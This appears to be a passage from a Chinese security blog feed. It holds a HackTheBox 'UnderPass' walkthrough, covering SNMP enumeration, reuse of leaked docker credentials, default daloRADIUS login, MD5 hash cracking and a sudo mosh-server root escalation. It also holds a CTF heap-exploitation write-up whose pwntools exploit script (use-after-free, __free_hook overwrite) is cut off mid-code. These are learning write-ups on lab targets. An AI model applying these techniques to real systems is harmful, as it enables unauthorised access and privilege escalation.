title="打波poc"></a>打波poc</h2><p>什么都没扫出来，但是我注意到一个奇怪的端口 161<br><img src="/Rxi134_FILE/698fd9e25e04af140c63e7e9a80e55a1_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="研究-SNMP服务"><a href="#研究-SNMP服务" class="headerlink" title="研究-SNMP服务"></a>研究-SNMP服务</h2><p>这里不赘述</p><h2 id="SNMP-TCP-161-服务渗透"><a href="#SNMP-TCP-161-服务渗透" class="headerlink" title="SNMP-TCP 161 服务渗透"></a>SNMP-TCP 161 服务渗透</h2><p>存在默认密码 public<br><img src="/Rxi134_FILE/cfe8bd36b38ba6002436f162b0d2f414_MD5.jpeg"></p><p>枚举信息<br><img src="/Rxi134_FILE/6875177ec2bcb0990ae4bfb400eb368f_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Host IP                       : 10.10.11.48Hostname                      : UnDerPass.htb is the only daloradius server in the basin!Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64Contact                       : steve@underpass.htbLocation                      : Nevada, U.S.A. but not VegasUptime snmp                   : 17:27:15.63Uptime system                 : 17:27:05.40System date                   : 2025-1-8 03:54:43.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="daloradius"><a href="#daloradius" class="headerlink" title="daloradius"></a>daloradius</h2><p>daloradius 是什么东西，上网看看<br><img src="/Rxi134_FILE/1d7aa0a2744b35ce001afd6ed5b0d931_MD5.jpeg"></p><p>这么说目录还有 &#x2F;daloradius ？<br><img src="/Rxi134_FILE/6bb08896997bf339e96d13d7e3b35cc6_MD5.jpeg"></p><p>访问<code>http://10.10.11.48/daloradius/</code>回显403！这说明目录下是有东西的哇<br><img src="/Rxi134_FILE/f4fb0e26f17ce7b164b61b55f316ef02_MD5.jpeg"></p><h3 id="扫目录1"><a href="#扫目录1" class="headerlink" title="扫目录1"></a>扫目录1</h3><p>再扫一波目录<br><img src="/Rxi134_FILE/a22be685ff4d13ce6eec54be9d7f3df4_MD5.jpeg"></p><p>有docker文件的泄露</p><ul><li><code>docker-compose.yml</code> 下有些密码信息：<pre class="line-numbers language-text" data-language="text"><code class="language-text">version: "3"services:  radius-mysql:    image: mariadb:10    container_name: radius-mysql    restart: unless-stopped    environment:      - MYSQL_DATABASE=radius      - MYSQL_USER=radius      - MYSQL_PASSWORD=radiusdbpw      - MYSQL_ROOT_PASSWORD=radiusrootdbpw    volumes:      - "./data/mysql:/var/lib/mysql"  radius:    container_name: radius    build:      context: .      dockerfile: Dockerfile-freeradius    restart: unless-stopped    depends_on:       - radius-mysql    ports:      - '1812:1812/udp'      - '1813:1813/udp'    environment:      - MYSQL_HOST=radius-mysql      - MYSQL_PORT=3306      - MYSQL_DATABASE=radius      - MYSQL_USER=radius      - MYSQL_PASSWORD=radiusdbpw      # Optional settings      - DEFAULT_CLIENT_SECRET=testing123    volumes:      - ./data/freeradius:/data    # If you want to disable debug output, remove the command parameter    command: -X  radius-web:    build: .    container_name: radius-web    restart: unless-stopped    depends_on:      - radius      - radius-mysql    ports:      - '80:80'      - '8000:8000'    environment:      - MYSQL_HOST=radius-mysql      - MYSQL_PORT=3306      - MYSQL_DATABASE=radius      - MYSQL_USER=radius      - MYSQL_PASSWORD=radiusdbpw      # Optional Settings:      - DEFAULT_CLIENT_SECRET=testing123      - DEFAULT_FREERADIUS_SERVER=radius      - MAIL_SMTPADDR=127.0.0.1      - MAIL_PORT=25      - MAIL_FROM=root@daloradius.xdsl.by      - MAIL_AUTH=    volumes:      - ./data/daloradius:/data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>但是怎么没见到 daloradius 的登录界面</p><ul><li>Dockerfile<pre class="line-numbers language-text" data-language="text"><code class="language-text"># Official daloRADIUS Dockerfile# GitHub: https://github.com/lirantal/daloradius## Build image:# 1. git pull git@github.com:lirantal/daloradius.git# 2. docker build . -t lirantal/daloradius## Run the container:# 1. docker run -p 80:80 -p 8000:8000 -d lirantal/daloradiusFROM debian:11-slimMAINTAINER Liran Tal &lt;liran.tal@gmail.com>LABEL Description="daloRADIUS Official Docker based on Debian 11 and PHP7." \License="GPLv2" \Usage="docker build . -t lirantal/daloradius &amp;&amp; docker run -d -p 80:80 -p 8000:8000 lirantal/daloradius" \Version="2.0beta"ENV DEBIAN_FRONTEND noninteractive# default timezoneENV TZ Europe/Vienna# PHP installRUN apt-get update \  &amp;&amp; apt-get install --yes --no-install-recommends \  ca-certificates \  apt-utils \  freeradius-utils \  tzdata \  apache2 \  libapache2-mod-php \  cron \  net-tools \  php \  php-common \  php-gd \  php-cli \  php-curl \  php-mail \  php-dev \  php-mail-mime \  php-mbstring \  php-db \  php-mysql \  php-zip \  mariadb-client \  default-libmysqlclient-dev \  unzip \  wget \  &amp;&amp; rm -rf /var/lib/apt/lists/*ADD contrib/docker/operators.conf /etc/apache2/sites-available/operators.confADD contrib/docker/users.conf /etc/apache2/sites-available/users.confRUN a2dissite 000-default.conf &amp;&amp; \    a2ensite users.conf operators.conf &amp;&amp; \    sed -i 's/Listen 80/Listen 80\nListen 8000/' /etc/apache2/ports.conf# Create directories# /data should be mounted as volume to avoid recreation of database entriesRUN mkdir /dataADD . /var/www/daloradius#RUN touch /var/www/html/library/daloradius.conf.phpRUN chown -R www-data:www-data /var/www/daloradius# Remove the original sample web folderRUN rm -rf /var/www/html## Create daloRADIUS Log fileRUN touch /tmp/daloradius.log &amp;&amp; chown -R www-data:www-data /tmp/daloradius.logRUN mkdir -p /var/log/apache2/daloradius &amp;&amp; chown -R www-data:www-data /var/log/apache2/daloradiusRUN echo "Mutex posixsem" >> /etc/apache2/apache2.conf## Expose Web port for daloRADIUSEXPOSE 80EXPOSE 8000### Run the script which executes Apache2 in the foreground as a running processCMD ["/bin/bash", "/var/www/daloradius/init.sh"]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="尝试密码重用（失败）"><a href="#尝试密码重用（失败）" class="headerlink" title="尝试密码重用（失败）"></a>尝试密码重用（失败）</h2><p>ssh密码，碰碰运气，用户名 steve</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">radiusradiusdbpwradiusrootdbpwtesting123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扫目录2（成功，确定登录点）"><a href="#扫目录2（成功，确定登录点）" class="headerlink" title="扫目录2（成功，确定登录点）"></a>扫目录2（成功，确定登录点）</h2><p>前面有几个目录是301：app&#x2F;、library&#x2F;、setup&#x2F;、doc&#x2F;，对着app&#x2F;再扫一波，扫到了！<br><img src="/Rxi134_FILE/d53edf6045f669d64b94aaacdb323346_MD5.jpeg"></p><p><code>http://underpass.htb/daloradius/app/users/login.php</code><br><img src="/Rxi134_FILE/ca66a12070b877ffe18e9972cf567700_MD5.jpeg"></p><h2 id="弱口令登录"><a href="#弱口令登录" class="headerlink" title="弱口令登录"></a>弱口令登录</h2><h3 id="默认密码登录（失败）"><a href="#默认密码登录（失败）" class="headerlink" title="默认密码登录（失败）"></a>默认密码登录（失败）</h3><p>尝试默认密码</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator/radius<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="弱口令爆破（失败）"><a href="#弱口令爆破（失败）" class="headerlink" title="弱口令爆破（失败）"></a>弱口令爆破（失败）</h3><p>我们现在已知：</p><ul><li>联系人<pre class="line-numbers language-text" data-language="text"><code class="language-text">steve@underpass.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>密码<pre class="line-numbers language-text" data-language="text"><code class="language-text">radiusradiusdbpwradiusrootdbpwtesting123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="寻找新攻击面"><a href="#寻找新攻击面" class="headerlink" title="寻找新攻击面"></a>寻找新攻击面</h2><h3 id="新入口"><a href="#新入口" class="headerlink" title="新入口"></a>新入口</h3><p>无果，到网上找下源码看看有没有其它信息</p><blockquote><p>地址：<a href="https://github.com/lirantal/daloradius/">daloradius&#x2F;app at master · lirantal&#x2F;daloradius</a></p></blockquote><p>突然发现网站还有一个目录 operators&#x2F;，并且下面也有login.php，有没有可能是另一个登录入口？<br><img src="/Rxi134_FILE/a403fdc548a8943f4add5be4aea28e4f_MD5.jpeg"></p><h3 id="默认密码登录（成功）"><a href="#默认密码登录（成功）" class="headerlink" title="默认密码登录（成功）"></a>默认密码登录（成功）</h3><p><code>http://underpass.htb/daloradius/app/operators/login.php</code><br><img src="/Rxi134_FILE/10dea5fb7ac730182d25edc017b09d0e_MD5.jpeg"></p><p>尝试默认密码</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator/radius<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功进入后台！<br><img src="/Rxi134_FILE/253a0627051323e1c585800cf95390fe_MD5.jpeg"></p><h3 id="发现新用户"><a href="#发现新用户" class="headerlink" title="发现新用户"></a>发现新用户</h3><p>翻找有没有可用的信息，发现有一个用户 svcMosh<br><img src="/Rxi134_FILE/396945461bfc890002ef999357d745dd_MD5.jpeg"></p><p>密码md5为：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">412DD4759978ACFCC81DEAB01B382403<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="爆破密码hash"><a href="#爆破密码hash" class="headerlink" title="爆破密码hash"></a>爆破密码hash</h3><p>使用 rockyou 的字典</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">0</span> <span class="token string">"412DD4759978ACFCC81DEAB01B382403"</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">19085</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>wordlists<span class="token punctuation">\</span>rockyou<span class="token punctuation">\</span>rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/0b63e41cefc7a39ad320b1dac3ecbeb8_MD5.jpeg"><br>还真爆出来了</p><p>现在我们有了一组可能的凭据</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">svcMosh:underwaterfriends<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="尝试ssh登录（成功）"><a href="#尝试ssh登录（成功）" class="headerlink" title="尝试ssh登录（成功）"></a>尝试ssh登录（成功）</h4><p>ssh直接能够登录！<br><img src="/Rxi134_FILE/3aff54eeea5edc4dee038adc5904e683_MD5.jpeg"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><p><img src="/Rxi134_FILE/4881bb1eb7ca8af99b36e8f3f27bdba3_MD5.jpeg"></p><h3 id="mosh-server"><a href="#mosh-server" class="headerlink" title="mosh-server"></a>mosh-server</h3><blockquote><p>Mosh表示移动Shell(Mobile Shell)，是一个用于从客户端跨互联网连接远程服务器的命令行工具。它能用于SSH连接，但是比Secure Shell功能更多。它是一个类似于SSH而带有更多功能的应用。程序最初由Keith Winstein 编写，用于类Unix的操作系统中，发布于GNU GPL V3协议下。<br>Mosh最大的特点是基于UDP方式传输，支持在服务端创建一个临时的Key供客户端一次性连接，退出后失效；也支持通过SSH的配置进行认证，但数据传输本身还是自身的UDP方式。</p></blockquote><h4 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h4><p>查看帮助</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Usage: mosh-server new <span class="token punctuation">[</span>-s<span class="token punctuation">]</span> <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i LOCALADDR<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PORT<span class="token punctuation">[</span>:PORT2<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>-c COLORS<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l <span class="token assign-left variable">NAME</span><span class="token operator">=</span>VALUE<span class="token punctuation">]</span> <span class="token punctuation">[</span>-- COMMAND<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有一个有趣的参数：<br><img src="/Rxi134_FILE/bd63058a6a78461573f008032fac87e5_MD5.jpeg"></p><p>安装mosh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mosh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在Server端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">svcMosh@underpass:~$ <span class="token function">sudo</span> mosh-server -- /bin/bashMOSH CONNECT <span class="token number">60001</span> U2zSkBl45bNNtkgP50q7qQmosh-server <span class="token punctuation">(</span>mosh <span class="token number">1.3</span>.2<span class="token punctuation">)</span> <span class="token punctuation">[</span>build mosh <span class="token number">1.3</span>.2<span class="token punctuation">]</span>Copyright <span class="token number">2012</span> Keith Winstein <span class="token operator">&lt;</span>mosh-devel@mit.edu<span class="token operator">></span>License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>.This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.<span class="token punctuation">[</span>mosh-server detached, pid <span class="token operator">=</span> <span class="token number">19180</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这相当于是一个临时登录，开放 UDP 60001端口接收客户端的连接，密钥为 U2zSkBl45bNNtkgP50q7qQ<br><img src="/Rxi134_FILE/19e3e3f6572b14436cedf9629ed0a6d6_MD5.jpeg"><br>成功开放</p><p>在Client端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MOSH_KEY</span><span class="token operator">=</span>U2zSkBl45bNNtkgP50q7qQ$ mosh-client <span class="token number">10.10</span>.11.48 <span class="token number">65001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/be0dae41a6f0d2cef2289beb9a2e16ff_MD5.jpeg"><br>提权成功！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>外网打了好几天才进去，还是太菜了</p><ul><li>snmp协议信息泄露很新颖，学习了</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025-01第三周：2022春秋杯 chunzhiIOT</title>
      <link href="/2025/01/12/2025-01%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9A2022%E6%98%A5%E7%A7%8B%E6%9D%AF%20chunzhiIOT/"/>
      <url>/2025/01/12/2025-01%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9A2022%E6%98%A5%E7%A7%8B%E6%9D%AF%20chunzhiIOT/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目描述：一个看似健康的IOT服务</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/c95b1f98c46d8da23424a4ea647b0034_MD5.jpeg"></p><p>给了libc，libc2.33-0ubuntu5_amd64</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><ul><li>主函数<br><img src="/EXP_FILE/d730e6caaf5f95931f8291cdf9841293_MD5.jpeg"><br><img src="/EXP_FILE/befbaba840c0f9ac03b46093b988d76f_MD5.jpeg"></li></ul><p><img src="/EXP_FILE/e28ff8f5420045c9b8642e896f7b6a8b_MD5.jpeg"></p><ul><li>处理请求正文<br><img src="/EXP_FILE/58b5a20c352937d2c0775e7bd8f6eea8_MD5.jpeg"></li></ul><p>要注意的是其中有一个check：<br><img src="/EXP_FILE/7c7c70017add048ed53dfb7677b010fb_MD5.jpeg"><br>这个全局变量默认为0<br><img src="/EXP_FILE/3dfad92b1c8efe81fcdc81a46f5f20ee_MD5.jpeg"></p><pre class="line-numbers language-none"><code class="language-none">add : 1&amp;index&amp;size&amp;contentedit : 2&amp;index&amp;contentshow : 3&amp;indexfree : 4&amp;index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先是实现交互，发包格式为（以POST为例）：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /url HTTP/1.1\r\nA: B\r\ncontent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先是过check，构造发包：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>package<span class="token operator">=</span><span class="token string">b'DEV /s HTTP/1.1\r\n'</span><span class="token operator">+</span><span class="token string">b'A: B\r\n'</span><span class="token operator">+</span><span class="token string">b'rotartsinimda'</span><span class="token comment">#dbg('b *$rebase(0x0000000000001827)\n')</span>sa<span class="token punctuation">(</span><span class="token string">'Waiting Package...\n'</span><span class="token punctuation">,</span>package<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后是堆菜单，由于choice是int类型，因此要发送字节流</p><p>有无限UAF，size&lt;&#x3D;0x500，glibc2.33。可以泄露libc和heap后直接打free_hook，注意引入的指针加密。<br>利用注意：</p><ul><li>add和edit是使用memcpy进行数据拷贝的，会收到00截断影响<br>本题其实就是套上了一个解析Http请求的背景，难点在逆向从而正确构造http请求</li></ul><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>package<span class="token operator">=</span><span class="token string">b'DEV /s HTTP/1.1\r\n'</span><span class="token operator">+</span><span class="token string">b'A: B\r\n'</span><span class="token operator">+</span><span class="token string">b'rotartsinimda'</span><span class="token comment">#dbg('b *$rebase(0x0000000000001827)\n')</span>sa<span class="token punctuation">(</span><span class="token string">'Waiting Package...\n'</span><span class="token punctuation">,</span>package<span class="token punctuation">)</span>header<span class="token operator">=</span><span class="token string">b'POST /s HTTP/1.1\r\n'</span><span class="token operator">+</span><span class="token string">b'A: B\r\n'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">:</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>package<span class="token operator">=</span>header<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f'\x01&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>size<span class="token punctuation">&#125;</span></span><span class="token string">&amp;'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>content<span class="token comment">#dbg('b *$rebase(0x0000000000001791)')</span>sa<span class="token punctuation">(</span><span class="token string">'Waiting Package...\n'</span><span class="token punctuation">,</span>package<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">:</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>package<span class="token operator">=</span>header<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f'\x02&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">&amp;'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>contentsa<span class="token punctuation">(</span><span class="token string">'Waiting Package...\n'</span><span class="token punctuation">,</span>package<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>package<span class="token operator">=</span>header<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f'\x03&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Waiting Package...\n'</span><span class="token punctuation">,</span>package<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>package<span class="token operator">=</span>header<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f'\x04&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Waiting Package...\n'</span><span class="token punctuation">,</span>package<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x420</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Content-Length: 6\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x1e0ff0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak2<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap<span class="token operator">=</span>leak2<span class="token operator">-</span><span class="token number">0x290</span>lg<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>enc_ptr<span class="token operator">=</span>free_hook<span class="token operator">^</span><span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x6c0</span><span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>enc_ptr<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#edit(0,p64(0))</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token 